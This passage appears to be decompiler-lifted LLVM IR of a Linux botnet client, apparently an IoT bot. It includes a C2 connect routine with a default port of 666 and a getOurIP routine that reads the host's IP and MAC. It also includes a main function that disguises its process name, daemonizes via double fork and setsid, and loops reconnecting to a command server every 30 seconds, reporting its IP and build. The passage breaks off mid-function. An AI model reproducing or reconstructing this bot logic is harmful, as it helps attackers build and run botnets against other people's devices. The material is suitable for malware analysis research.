  %v1_804fe3e = icmp eq i32 %v0_804fe39, 0
  br i1 %v1_804fe3e, label %dec_label_pc_804fe59, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %entry
  %v1_804fe4a = call i32 @__libc_close(i32 %v0_804fe39)
  store i32 0, i32* @global_var_805b540.20, align 64
  br label %dec_label_pc_804fe59

dec_label_pc_804fe59:                             ; preds = %entry, %dec_label_pc_804fe42
  %v0_804fe59 = load i32, i32* @global_var_805b19c.434, align 4
  %v1_804fe5e = icmp eq i32 %v0_804fe59, 0
  %v1_804fe60 = icmp eq i1 %v1_804fe5e, false
  br i1 %v1_804fe60, label %dec_label_pc_804fe6e, label %dec_label_pc_804fe79

dec_label_pc_804fe6e:                             ; preds = %dec_label_pc_804fe59
  %v1_804fe73 = add i32 %v0_804fe59, 1
  br label %dec_label_pc_804fe79

dec_label_pc_804fe79:                             ; preds = %dec_label_pc_804fe59, %dec_label_pc_804fe6e
  %storemerge = phi i32 [ %v1_804fe73, %dec_label_pc_804fe6e ], [ 0, %dec_label_pc_804fe59 ]
  store i32 %storemerge, i32* @global_var_805b19c.434, align 4
  %v1_804fe7e = mul i32 %storemerge, 4
  %v2_804fe7e = add i32 %v1_804fe7e, ptrtoint ([19 x i8]** @global_var_805b198.435 to i32)
  %v3_804fe7e = inttoptr i32 %v2_804fe7e to i32*
  %v4_804fe7e = load i32, i32* %v3_804fe7e, align 4
  store i32 %v4_804fe7e, i32* @eax, align 4
  %v3_804fe92 = call i32 @strcpy(i8* %v3_804fe34, i32 %v4_804fe7e)
  %v3_804feaf = call i32 @__GI_strchr(i8* %v3_804fe34, i32 58)
  %v1_804feb4 = icmp eq i32 %v3_804feaf, 0
  br i1 %v1_804feb4, label %dec_label_pc_804fef3, label %dec_label_pc_804feb8

dec_label_pc_804feb8:                             ; preds = %dec_label_pc_804fe79
  %v3_804fec9 = call i32 @__GI_strchr(i8* %v3_804fe34, i32 58)
  %v1_804fece = add i32 %v3_804fec9, 1
  %v1_804fed2 = call i32 @atol(i32 %v1_804fece)
  %v3_804feeb = call i32 @__GI_strchr(i8* %v3_804fe34, i32 58)
  %v4_804feeb = inttoptr i32 %v3_804feeb to i8*
  store i8 0, i8* %v4_804feeb, align 1
  br label %dec_label_pc_804fef3

dec_label_pc_804fef3:                             ; preds = %dec_label_pc_804fe79, %dec_label_pc_804feb8
  %stack_var_-8.0 = phi i32 [ 666, %dec_label_pc_804fe79 ], [ %v1_804fed2, %dec_label_pc_804feb8 ]
  %v3_804ff0a = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804ff0a, i32* @global_var_805b540.20, align 64
  %v4_804ff36 = call i32 @connectTimeout(i32 %v3_804ff0a, i32 %v2_804fe18, i32 %stack_var_-8.0, i32 30)
  %v1_804ff3b = icmp eq i32 %v4_804ff36, 0
  %. = zext i1 %v1_804ff3b to i32
  %v2_804ff5b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff5b, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804fef3, { 1, 0 }
  uselistorder label %dec_label_pc_804fe79, { 1, 0 }
  uselistorder label %dec_label_pc_804fe59, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff5d = load i32, i32* @ebp, align 4
  store i32 %v0_804ff5d, i32* %stack_var_-4, align 4
  %v5_804ff7d = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804ff85 = icmp eq i32 %v5_804ff7d, -1
  %v1_804ff89 = icmp eq i1 %v13_804ff85, false
  br i1 %v1_804ff89, label %dec_label_pc_804ff9a, label %dec_label_pc_8050178

dec_label_pc_804ff9a:                             ; preds = %entry
  %v2_804ff9a = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804ffc5 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8059601.436 to i32))
  %v3_804ffd4 = call i32 @htons(i16 53)
  %v5_804fff5 = call i32 @__libc_connect(i32 %v5_804ff7d, i32 %v2_804ff9a, i32 16)
  %v13_804fffd = icmp eq i32 %v5_804fff5, -1
  %v1_8050001 = icmp eq i1 %v13_804fffd, false
  br i1 %v1_8050001, label %dec_label_pc_8050012, label %dec_label_pc_8050178

dec_label_pc_8050012:                             ; preds = %dec_label_pc_804ff9a
  store i32 16, i32* %stack_var_-60, align 4
  %v2_8050019 = ptrtoint i32* %stack_var_-56 to i32
  %v2_805001c = ptrtoint i32* %stack_var_-60 to i32
  %v5_805002d = call i32 @__GI_getsockname(i32 %v5_804ff7d, i32 %v2_8050019, i32 %v2_805001c)
  %v13_8050035 = icmp eq i32 %v5_805002d, -1
  %v1_8050039 = icmp eq i1 %v13_8050035, false
  br i1 %v1_8050039, label %dec_label_pc_805004a, label %dec_label_pc_8050178

dec_label_pc_805004a:                             ; preds = %dec_label_pc_8050012
  %v5_8050061 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8059609.437, i32 0, i32 0), i32 0)
  %v2_80500c6 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_80500de34 = call i32 @fdgets(i32 %v2_80500c6, i32 4096, i32 %v5_8050061)
  %v1_80500e335 = icmp eq i32 %v5_80500de34, 0
  %v1_80500e537 = icmp eq i1 %v1_80500e335, false
  br i1 %v1_80500e537, label %dec_label_pc_805006b, label %dec_label_pc_80500e7

dec_label_pc_805006b:                             ; preds = %dec_label_pc_805004a, %dec_label_pc_80500a5
  %v5_805007c = call i32 @strstr(i32 %v2_80500c6, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059619.438, i32 0, i32 0))
  %v1_8050081 = icmp eq i32 %v5_805007c, 0
  br i1 %v1_8050081, label %dec_label_pc_80500a5, label %dec_label_pc_8050093

dec_label_pc_8050090:                             ; preds = %dec_label_pc_8050093
  %v4_8050093 = ptrtoint i8* %storemerge5 to i32
  %v5_8050090 = add i32 %v4_8050093, 1
  %v22_8050090 = inttoptr i32 %v5_8050090 to i8*
  br label %dec_label_pc_8050093

dec_label_pc_8050093:                             ; preds = %dec_label_pc_805006b, %dec_label_pc_8050090
  %storemerge5 = phi i8* [ %v22_8050090, %dec_label_pc_8050090 ], [ %stack_var_-4156, %dec_label_pc_805006b ]
  %v2_8050096 = load i8, i8* %storemerge5, align 1
  %v10_8050099 = icmp eq i8 %v2_8050096, 9
  %v1_805009b = icmp eq i1 %v10_8050099, false
  br i1 %v1_805009b, label %dec_label_pc_8050090, label %dec_label_pc_805009d

dec_label_pc_805009d:                             ; preds = %dec_label_pc_8050093
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_80500e7

dec_label_pc_80500a5:                             ; preds = %dec_label_pc_805006b
  %v6_80500c1 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_80500de = call i32 @fdgets(i32 %v2_80500c6, i32 4096, i32 %v5_8050061)
  %v1_80500e3 = icmp eq i32 %v5_80500de, 0
  %v1_80500e5 = icmp eq i1 %v1_80500e3, false
  br i1 %v1_80500e5, label %dec_label_pc_805006b, label %dec_label_pc_80500e7

dec_label_pc_80500e7:                             ; preds = %dec_label_pc_805004a, %dec_label_pc_80500a5, %dec_label_pc_805009d
  %v2_80500ed = call i32 @__libc_close(i32 %v5_8050061)
  %v3_80500f2 = load i8, i8* %stack_var_-4156, align 1
  %v4_80500f9 = icmp eq i8 %v3_80500f2, 0
  br i1 %v4_80500f9, label %dec_label_pc_805015f, label %dec_label_pc_80500fd

dec_label_pc_80500fd:                             ; preds = %dec_label_pc_80500e7
  %v2_8050107 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_8050107, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_8050110 = call i32 @strcpy(i8* %tmp32, i32 %v2_80500c6)
  %v5_805012d = call i32 @ioctl(i32 %v5_804ff7d, i32 35111, i32 %v2_8050107)
  %v2_8050144 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_805013b

dec_label_pc_805013b:                             ; preds = %dec_label_pc_80500fd, %dec_label_pc_805013b
  %storemerge33 = phi i32 [ 0, %dec_label_pc_80500fd ], [ %v4_8050156, %dec_label_pc_805013b ]
  %v2_805014a = add i32 %storemerge33, %v2_8050144
  %v1_805014d = inttoptr i32 %v2_805014a to i8*
  %v2_805014d = load i8, i8* %v1_805014d, align 1
  %v3_8050150 = add i32 %storemerge33, ptrtoint (i8** @global_var_805b550.439 to i32)
  %v4_8050150 = inttoptr i32 %v3_8050150 to i8*
  store i8 %v2_805014d, i8* %v4_8050150, align 1
  %v4_8050156 = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_8050156, 6
  br i1 %exitcond, label %dec_label_pc_805015f, label %dec_label_pc_805013b

dec_label_pc_805015f:                             ; preds = %dec_label_pc_805013b, %dec_label_pc_80500e7
  %v2_8050165 = call i32 @__libc_close(i32 %v5_804ff7d)
  br label %dec_label_pc_8050178

dec_label_pc_8050178:                             ; preds = %entry, %dec_label_pc_804ff9a, %dec_label_pc_8050012, %dec_label_pc_805015f
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_805015f ], [ 0, %dec_label_pc_8050012 ], [ 0, %dec_label_pc_804ff9a ], [ 0, %entry ]
  %v2_805017e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805017e, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_80500c6, { 1, 3, 2, 0 }
  uselistorder i32 %v5_8050061, { 1, 2, 0 }
  uselistorder i32 %v5_804ff7d, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_8050178, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805013b, { 1, 0 }
  uselistorder label %dec_label_pc_80500e7, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050093, { 1, 0 }
  uselistorder label %dec_label_pc_805006b, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_8059624.440 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_805018a = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805018a, i32* %stack_var_-24, align 4
  %v5_805019b = icmp ult i32* %stack_var_-24, inttoptr (i32 5864 to i32*)
  store i1 %v5_805019b, i1* %cf.global-to-local, align 1
  %v1_80501b4 = add i32 %v2_805018a, 4
  %v2_80501b4 = inttoptr i32 %v1_80501b4 to i32*
  %v3_80501b4 = load i32, i32* %v2_80501b4, align 4
  %v1_80501b7 = inttoptr i32 %v3_80501b4 to i32*
  %v2_80501b7 = load i32, i32* %v1_80501b7, align 4
  store i1 false, i1* @df, align 1
  %v4_80501c7 = inttoptr i32 %v2_80501b7 to i8*
  store i32 %v2_80501b7, i32* @edi, align 4
  %v3_80501cd = call i32 @_strlen(i8* %v4_80501c7)
  %v3_80501dc = load i32, i32* %v2_80501b4, align 4
  %v1_80501df = inttoptr i32 %v3_80501dc to i32*
  %v2_80501df = load i32, i32* %v1_80501df, align 4
  store i32 %v2_80501df, i32* %stack_var_-5888, align 4
  %v4_80501f0 = inttoptr i32 %v2_80501df to i8*
  %v5_80501f0 = call i32 @strncpy(i8* %v4_80501f0, i32 ptrtoint (i32* @global_var_805962a.441 to i32), i32 %v3_80501cd)
  store i32 %v2_805018a, i32* @esi, align 4
  %v3_8050200 = load i32, i32* %v2_80501b4, align 4
  %v2_8050203 = inttoptr i32 %v3_8050200 to i32*
  store i32 ptrtoint (i32* @global_var_805962a.441 to i32), i32* %v2_8050203, align 4
  store i32 15, i32* %stack_var_-5888, align 4
  %v6_805022b = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_805962a.441 to i32), i32 0, i32 0, i32 0)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_8050237 = call i32 @__GI_time(i32* null)
  store i32 %v2_8050237, i32* @ebx, align 4
  %v0_805023e = call i32 @__libc_getpid()
  %v1_8050243 = load i32, i32* @ebx, align 4
  %v2_8050243 = xor i32 %v1_8050243, %v0_805023e
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_8050243, i32* @eax, align 4
  store i32 %v2_8050243, i32* %stack_var_-5888, align 4
  %v1_8050248 = call i32 @srand(i32 %v2_8050243)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_8050254 = call i32 @__GI_time(i32* null)
  store i32 %v2_8050254, i32* @ebx, align 4
  %v0_805025b = call i32 @__libc_getpid()
  %v1_8050260 = load i32, i32* @ebx, align 4
  %v2_8050260 = xor i32 %v1_8050260, %v0_805025b
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_8050260, i32* %stack_var_-5888, align 4
  %v1_8050265 = call i32 @init_rand(i32 %v2_8050260)
  store i32 ptrtoint ([19 x i8]* @global_var_805962b.442 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_805962b.442 to i32), i32* %stack_var_-5888, align 4
  %v3_8050286 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_805962b.442 to i32), i32 ptrtoint ([2 x i8]* @global_var_805963e.443 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805028e = icmp eq i32 %v3_8050286, 0
  %v1_8050292 = icmp eq i1 %v4_805028e, false
  br i1 %v1_8050292, label %dec_label_pc_80502b1, label %dec_label_pc_8050294

dec_label_pc_8050294:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_8059640.444 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_8059640.444 to i32), i32* %stack_var_-5888, align 4
  %v3_80502a9 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8059640.444 to i32), i32 ptrtoint ([2 x i8]* @global_var_805963e.443 to i32))
  br label %dec_label_pc_80502b1

dec_label_pc_80502b1:                             ; preds = %entry, %dec_label_pc_8050294
  %stack_var_-88.0 = phi i32 [ %v3_8050286, %entry ], [ %v3_80502a9, %dec_label_pc_8050294 ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805962b.442, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059640.444, i32 0, i32 0), %dec_label_pc_8050294 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80502b1 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_80502b1, label %dec_label_pc_8050453, label %dec_label_pc_80502bb

dec_label_pc_80502bb:                             ; preds = %dec_label_pc_80502b1
  %v3_80502c1 = load i32, i32* %v2_80501b4, align 4
  %v1_80502c4 = inttoptr i32 %v3_80502c1 to i32*
  %v2_80502c4 = load i32, i32* %v1_80502c4, align 4
  store i1 false, i1* @df, align 1
  %v4_80502d4 = inttoptr i32 %v2_80502c4 to i8*
  store i32 %v2_80502c4, i32* @edi, align 4
  %v3_80502da = call i32 @_strlen(i8* %v4_80502d4)
  %v2_80502f3 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_80502f3, i32* %stack_var_-5888, align 4
  %v3_80502fc = call i32 @getcwd(i32 %v2_80502f3, i32 256)
  store i1 false, i1* @df, align 1
  %v4_8050322 = bitcast i32* %stack_var_-368 to i8*
  store i32 %v2_80502f3, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_805964d.445 to i32), i32* @edi, align 4
  %v7_8050334 = call i32 @_strncmp(i8* %v4_8050322, i8* bitcast (i8** @global_var_805964d.445 to i8*), i32 2)
  %v8_8050334 = urem i32 %v7_8050334, 2
  %v9_8050334 = icmp eq i32 %v8_8050334, 0
  %v0_8050336 = load i1, i1* @cf, align 1
  %v2_8050336 = or i1 %v0_8050336, %v9_8050334
  %v3_8050336 = zext i1 %v2_8050336 to i8
  %v7_8050336 = xor i8 %v3_8050336, 1
  %v5_8050339 = ptrtoint i32* %stack_var_-512 to i32
  %v3_805033c = and i32 %v7_8050334, -256
  %v3_805033e = trunc i32 %v5_8050339 to i8
  %v4_805033e = sub i8 %v7_8050336, %v3_805033e
  %v15_805033e = icmp eq i8 %v4_805033e, 0
  %v20_805033e = zext i8 %v4_805033e to i32
  %v23_805033e = or i32 %v20_805033e, %v3_805033c
  store i32 %v23_805033e, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_805033e, label %dec_label_pc_8050448, label %dec_label_pc_8050352

dec_label_pc_805034f:                             ; preds = %dec_label_pc_8050352
  %v4_805034f = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_8050352

dec_label_pc_8050352:                             ; preds = %dec_label_pc_80502bb, %dec_label_pc_805034f
  %stack_var_-84.0 = phi i32 [ %v4_805034f, %dec_label_pc_805034f ], [ %v3_80502da, %dec_label_pc_80502bb ]
  store i32 %v2_805018a, i32* @esi, align 4
  %v3_8050358 = load i32, i32* %v2_80501b4, align 4
  %v1_805035b = inttoptr i32 %v3_8050358 to i32*
  %v2_805035b = load i32, i32* %v1_805035b, align 4
  %v2_8050360 = add i32 %v2_805035b, %stack_var_-84.0
  %v1_8050363 = inttoptr i32 %v2_8050360 to i8*
  %v2_8050363 = load i8, i8* %v1_8050363, align 1
  %v6_8050366 = icmp ult i8 %v2_8050363, 47
  store i1 %v6_8050366, i1* %cf.global-to-local, align 1
  %v10_8050366 = icmp eq i8 %v2_8050363, 47
  %v1_8050368 = icmp eq i1 %v10_8050366, false
  br i1 %v1_8050368, label %dec_label_pc_805034f, label %dec_label_pc_805036a

dec_label_pc_805036a:                             ; preds = %dec_label_pc_8050352
  store i32 %v2_805018a, i32* @edi, align 4
  %v3_8050370 = load i32, i32* %v2_80501b4, align 4
  %v1_8050373 = inttoptr i32 %v3_8050370 to i32*
  %v2_8050373 = load i32, i32* %v1_8050373, align 4
  %v2_8050378 = add i32 %v2_8050373, %stack_var_-84.0
  %v2_8050391 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_8050391, i32* %stack_var_-5888, align 4
  %v5_805039a = call i32 @sprintf(i32 %v2_8050391, i32 ptrtoint ([8 x i8]* @global_var_805964f.446 to i32), i32 %v2_80502f3, i32 %v2_8050378)
  %v1_80503e3 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_80503b0 = ptrtoint i32* %stack_var_-1648 to i32
  %v3_80503d1 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_80503dd.outer

dec_label_pc_80503a1:                             ; preds = %dec_label_pc_80503dd
  store i32 %v2_80503b0, i32* %stack_var_-5888, align 4
  %v4_80503b9 = call i32 @fgets(i32 %v2_80503b0, i32 1024, i32 %stack_var_-88.0)
  store i32 %v2_80503b0, i32* %stack_var_-5888, align 4
  %v4_80503d1 = call i32 @__GI_strcasecmp(i8* %v3_80503d1, i32 %v2_8050391)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503d6 = icmp eq i32 %v4_80503d1, 0
  %v1_80503d8 = icmp eq i1 %v1_80503d6, false
  br i1 %v1_80503d8, label %dec_label_pc_80503dd, label %dec_label_pc_80503da

dec_label_pc_80503da:                             ; preds = %dec_label_pc_80503a1
  %v4_80503da = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_80503dd.outer

dec_label_pc_80503dd.outer:                       ; preds = %dec_label_pc_80503da, %dec_label_pc_805036a
  %stack_var_-80.0.ph = phi i32 [ %v4_80503da, %dec_label_pc_80503da ], [ 0, %dec_label_pc_805036a ]
  br label %dec_label_pc_80503dd

dec_label_pc_80503dd:                             ; preds = %dec_label_pc_80503dd.outer, %dec_label_pc_80503a1
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_80503e3 = call i32 @feof(i16* %v1_80503e3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503e8 = icmp eq i32 %v2_80503e3, 0
  br i1 %v1_80503e8, label %dec_label_pc_80503a1, label %dec_label_pc_80503ec

dec_label_pc_80503ec:                             ; preds = %dec_label_pc_80503dd
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80503ec = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_80503f0 = icmp eq i1 %v4_80503ec, false
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_8050441 = call i32 @__GI_fclose(i16* %v1_80503e3)
  br i1 %v1_80503f0, label %dec_label_pc_8050453, label %dec_label_pc_80503f2

dec_label_pc_80503f2:                             ; preds = %dec_label_pc_80503ec
  %v4_8050405 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_8050405, i32* @eax, align 4
  store i32 %v4_8050405, i32* %stack_var_-5888, align 4
  %v3_805040b = call i32 @__GI_fopen(i32 %v4_8050405, i32 ptrtoint (i32* @global_var_8059657.447 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050413 = icmp eq i32 %v3_805040b, 0
  br i1 %v4_8050413, label %dec_label_pc_8050453, label %dec_label_pc_8050419

dec_label_pc_8050419:                             ; preds = %dec_label_pc_80503f2
  store i32 %v2_8050391, i32* %stack_var_-5888, align 4
  %v3_8050429 = call i32 @__GI_fputs(i32 %v2_8050391, i32 %v3_805040b)
  store i32 %v3_805040b, i32* @eax, align 4
  store i32 %v3_805040b, i32* %stack_var_-5888, align 4
  %v1_8050434 = inttoptr i32 %v3_805040b to i16*
  %v2_8050434 = call i32 @__GI_fclose(i16* %v1_8050434)
  br label %dec_label_pc_8050453

dec_label_pc_8050448:                             ; preds = %dec_label_pc_80502bb
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v1_805044e = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_805044e = call i32 @__GI_fclose(i16* %v1_805044e)
  br label %dec_label_pc_8050453

dec_label_pc_8050453:                             ; preds = %dec_label_pc_80503ec, %dec_label_pc_80503f2, %dec_label_pc_80502b1, %dec_label_pc_8050419, %dec_label_pc_8050448
  %v0_8050453 = call i32 @getOurIP()
  %v0_8050458 = load i32, i32* %stack_var_-5888, align 4
  %v1_8050458 = call i32 @__libc_fork(i32 %v0_8050458)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050460 = icmp eq i32 %v1_8050458, 0
  br i1 %v4_8050460, label %dec_label_pc_8050492, label %dec_label_pc_80504c1

dec_label_pc_8050492:                             ; preds = %dec_label_pc_8050453
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_8050492 = load i32, i32* %stack_var_-5888, align 4
  %v1_8050492 = call i32 @__libc_fork(i32 %v0_8050492)
  store i32 %v1_8050492, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805049a = icmp eq i32 %v1_8050492, 0
  br i1 %v4_805049a, label %dec_label_pc_80504ac.thread, label %dec_label_pc_80504b2

dec_label_pc_80504ac.thread:                      ; preds = %dec_label_pc_8050492
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80504ce

dec_label_pc_80504b2:                             ; preds = %dec_label_pc_8050492
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_80504a7 = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8059659.448 to i32), i32* %stack_var_-5888, align 4
  %v1_80504ba = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8059659.448 to i32))
  br label %dec_label_pc_80504ce

dec_label_pc_80504c1:                             ; preds = %dec_label_pc_8050453
  %v2_805046e = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_8050458, i32* %stack_var_-5888, align 4
  %v4_805047b = call i32 @__libc_waitpid(i32 %v1_8050458, i32 %v2_805046e, i32 0)
  store i32 %v4_805047b, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_8050487 = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8059659.448 to i32), i32* %stack_var_-5888, align 4
  %v1_80504c9 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8059659.448 to i32))
  br label %dec_label_pc_80504ce

dec_label_pc_80504ce:                             ; preds = %dec_label_pc_80504ac.thread, %dec_label_pc_80504b2, %dec_label_pc_80504c1
  %v0_80504ce = call i32 @__GI_setsid()
  store i32 ptrtoint (i8** @global_var_805964d.445 to i32), i32* %stack_var_-5888, align 4
  %v1_80504da = call i32 @chdir(i32 ptrtoint (i8** @global_var_805964d.445 to i32))
  store i32 13, i32* %stack_var_-5888, align 4
  %v3_80504ee = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8050bab = ptrtoint i32* %stack_var_-5744 to i32
  %tmp121 = bitcast i32* %stack_var_-5744 to i8*
  %tmp122 = bitcast i8** %stack_var_-36 to i32*
  %v2_805099a = ptrtoint i32* %stack_var_-1648 to i32
  %v4_80509b6 = bitcast i32* %stack_var_-1648 to i8*
  %v1_8050817 = or i32 %v2_8050bab, 1
  %storemerge13127 = inttoptr i32 %v1_8050817 to i8*
  br label %dec_label_pc_80504f5.outer

dec_label_pc_80504f5.outer:                       ; preds = %dec_label_pc_80507d7, %dec_label_pc_8050bab, %dec_label_pc_80504ce
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_80504ce ], [ %stack_var_-96.2.ph, %dec_label_pc_8050bab ], [ %v4_80507d7, %dec_label_pc_80507d7 ]
  %v0_80504f524 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80504fa25 = icmp eq i32 %v0_80504f524, 0
  br i1 %v1_80504fa25, label %dec_label_pc_805050c, label %dec_label_pc_80504fe

dec_label_pc_80504fe:                             ; preds = %dec_label_pc_80504f5.outer, %dec_label_pc_80504fe
  store i32 30, i32* %stack_var_-5888, align 4
  %v1_8050505 = call i32 @sleep(i32 30)
  %v0_80504f5 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80504fa = icmp eq i32 %v0_80504f5, 0
  br i1 %v1_80504fa, label %dec_label_pc_805050c, label %dec_label_pc_80504fe

dec_label_pc_805050c:                             ; preds = %dec_label_pc_80504fe, %dec_label_pc_80504f5.outer
  %v0_805050c = load i32, i32* @global_var_80617c8.235, align 8
  store i32 %v0_805050c, i32* %stack_var_-5888, align 4
  %v1_8050514 = call i32 @__GI_inet_ntoa(i32 %v0_805050c)
  store i32 %v1_8050514, i32* @ebx, align 4
  %v0_805051b = call i32 @getBuild()
  %v0_8050520 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_8050520, i32* %stack_var_-5888, align 4
  %v3_8050539 = call i32 @sockprintf(i32 %v0_8050520, i32 ptrtoint ([12 x i8]* @global_var_8059666.449 to i32))
  br label %dec_label_pc_8050bab.outer

dec_label_pc_805055d:                             ; preds = %dec_label_pc_805074e, %dec_label_pc_8050706
  %v2_8050560 = mul i32 %storemerge14, 4
  %v9_8050560 = and i32 %storemerge14, 1073741824
  %v10_8050560 = icmp ne i32 %v9_8050560, 0
  store i1 %v10_8050560, i1* %cf.global-to-local, align 1
  %v0_8050565 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_805056a = add i32 %v0_8050565, %v2_8050560
  %v1_805056d = inttoptr i32 %v2_805056a to i32*
  %v2_805056d = load i32, i32* %v1_805056d, align 4
  store i32 %v2_805056d, i32* %stack_var_-5888, align 4
  %v4_8050582 = call i32 @__libc_waitpid(i32 %v2_805056d, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_8050582, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp123, label %dec_label_pc_8050703, label %dec_label_pc_805058f

dec_label_pc_805058f:                             ; preds = %dec_label_pc_805055d
  br label %dec_label_pc_80505c2

dec_label_pc_8050598:                             ; preds = %dec_label_pc_80505c2, %dec_label_pc_80505fc
  %v2_805059b = mul i32 %storemerge16, 4
  %v0_80505a0 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_80505a5 = add i32 %v0_80505a0, %v2_805059b
  %v1_80505a8 = add i32 %v2_80505a5, -4
  %v1_80505bb = inttoptr i32 %v2_80505a5 to i32*
